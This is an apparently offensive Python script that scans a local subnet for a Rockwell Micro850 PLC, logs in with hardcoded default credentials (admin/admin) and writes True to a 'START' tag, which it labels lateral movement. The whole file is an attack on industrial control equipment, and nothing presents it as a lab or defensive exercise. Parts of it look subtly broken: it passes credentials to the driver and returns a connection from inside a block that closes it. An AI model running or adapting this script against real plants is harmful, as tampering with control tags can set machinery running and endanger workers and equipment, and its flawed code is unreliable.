import socket
import requests
from pycomm3 import LogixDriver

# Default credentials for the Rockwell Micro850 PLC
DEFAULT_USERNAME = 'admin'
DEFAULT_PASSWORD = 'admin'

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the subnet to scan (e.g., 192.168.1.0/24)
    subnet = '192.168.1.'
    
    # Scan the subnet for devices
    for i in range(1, 255):
        ip = f"{subnet}{i}"
        try:
            # Attempt to connect to the PLC
            with LogixDriver(ip) as plc:
                if plc.info:
                    print(f"PLC found at IP: {ip}")
                    return ip
        except Exception as e:
            continue
    print("PLC not found in the specified subnet.")
    return None

# Function to connect to the PLC using default credentials
def connect_to_plc(ip, username, password):
    try:
        # Connect to the PLC
        with LogixDriver(ip, username=username, password=password) as plc:
            if plc.info:
                print(f"Connected to PLC at IP: {ip}")
                return plc
    except Exception as e:
        print(f"Failed to connect to PLC at IP: {ip} - {e}")
    return None

# Function to perform lateral movement
def lateral_movement(plc):
    try:
        # Example: Read a tag value
        tag_value = plc.read('START')
        print(f"Tag 'START' value: {tag_value}")

        # Example: Write a tag value
        plc.write('START', True)
        print("Tag 'START' set to True")

        # Additional actions can be performed here
    except Exception as e:
        print(f"Failed to perform lateral movement - {e}")

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip:
        # Connect to the PLC using default credentials
        plc = connect_to_plc(plc_ip, DEFAULT_USERNAME, DEFAULT_PASSWORD)
        if plc:
            # Perform lateral movement
            lateral_movement(plc)

if __name__ == "__main__":
    main()